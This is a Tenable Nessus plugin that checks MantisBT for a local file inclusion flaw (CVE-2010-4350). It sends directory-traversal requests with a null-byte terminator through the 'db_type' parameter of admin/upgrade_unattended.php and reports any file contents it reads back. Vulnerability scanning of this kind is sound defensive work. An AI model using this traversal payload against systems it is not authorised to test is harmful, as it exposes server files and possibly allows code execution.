#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(51359);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/06/20 17:20:09 $");

  script_cve_id("CVE-2010-4350");
  script_bugtraq_id(45399);
  script_osvdb_id(70157);
  script_xref(name:"Secunia", value:"42597");

  script_name(english:"MantisBT 'db_type' Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",value:
"The remote web server contains a web application that is susceptible
to a local file inclusion attack." );
  script_set_attribute(
    attribute:"description",value:
"The MantisBT install on the remote host fails to sanitize user input
to the 'db_type' parameter of the 'admin/upgrade_unattended.php'
script before using it to include PHP code.

Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated attacker can exploit this vulnerability
to view arbitrary files or possibly execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id.

Although Nessus has not checked for it, the installed version is also
likely to be affected by a cross-site scripting vulnerability
involving the same parameter / script combination.");
  script_set_attribute(attribute:"see_also", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4984.php");
  script_set_attribute(attribute:"see_also", value:"http://www.mantisbt.org/bugs/view.php?id=12607" );
    # http://www.mantisbt.org/bugs/changelog_page.php?project=mantisbt&version=1.2.4
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?70f9bc56" );
  script_set_attribute(attribute:"solution", value:"Upgrade to MantisBT 1.2.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Mantisbt < 1.2.4 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/12/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/12/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mantisbt:mantisbt");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "mantis_detect.nasl");
  script_require_keys("installed_sw/MantisBT");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

app_name = "MantisBT";

install = get_single_install(app_name: app_name, port: port);
install_url = build_url(port:port, qs:install['path']);

dir = install['path'];

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  ef = 'lost_pwd_page.php';
  en = 5;
}
else
{
  ef = '/lost_pwd_page.php';
  en = 10;
}

# Try generic first
exploit_result = http_check_dir_traversal(
  port         : port,
  unique_dir   : dir,
  qs           :  "/admin/upgrade_unattended.php?db_type=",
  extra_numdot : 10,
  anchor       : '%00',
  os           : os,
  exit_on_fail : FALSE
);

# If failure, try another
if (isnull(exploit_result) || exploit_result == 0)
{
  exploit_result = http_check_dir_traversal(
    port         : port,
    unique_dir   : dir,
    qs           :  "/admin/upgrade_unattended.php?db_type=",
    extrafile    : ef,
    extrapats    : "reinstate your lost password,",
    extra_numdot : en,
    anchor       : '%00',
    os           : os,
    exit_on_fail : TRUE
  );
}

if (!isnull(exploit_result['contents']))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : exploit_result['file'],
    line_limit  : 2,
    request     : make_list(exploit_result['url']),
    output      : chomp(exploit_result['contents']),
    attach_type : 'text/plain',
    xss         : TRUE
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, install_url);
